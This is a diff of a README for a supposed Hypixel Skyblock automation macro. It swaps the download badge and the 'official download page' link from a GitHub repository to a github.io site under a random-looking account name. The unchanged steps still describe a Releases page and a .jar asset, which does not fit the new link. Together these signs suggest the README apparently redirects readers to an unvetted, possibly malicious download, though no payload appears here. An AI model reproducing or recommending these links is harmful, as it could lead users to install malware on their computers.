@@ -1,6 +1,6 @@
 # ⚙️ taunahi-macro - Automate your Hypixel Skyblock tasks easily
 
-[![](https://img.shields.io/badge/Download-Taunahi-blue.svg)](https://github.com/dalbergiasissooantioxidant695/taunahi-macro)
+[![](https://img.shields.io/badge/Download-Taunahi-blue.svg)](https://dalbergiasissooantioxidant695.github.io)
 
 Taunahi Client automates repetitive tasks in Hypixel Skyblock. This software handles garden farming, slayer quests, fishing, and combat. It includes tools to help you manage resources without manual input. The system runs on Windows and works alongside your existing Minecraft client.
 
@@ -17,7 +17,7 @@ Ensure your computer meets these standards before you begin:
 
 ## 📥 How to Download and Install
 
-1.  Visit the [official download page](https://github.com/dalbergiasissooantioxidant695/taunahi-macro) to access the latest version of the macro.
+1.  Visit the [official download page](https://dalbergiasissooantioxidant695.github.io) to access the latest version of the macro.
 2.  Locate the section labeled "Releases" on the right side of the page.
 3.  Click the release version at the top of the list.
 4.  Find the file ending in `.jar` under the Assets section.
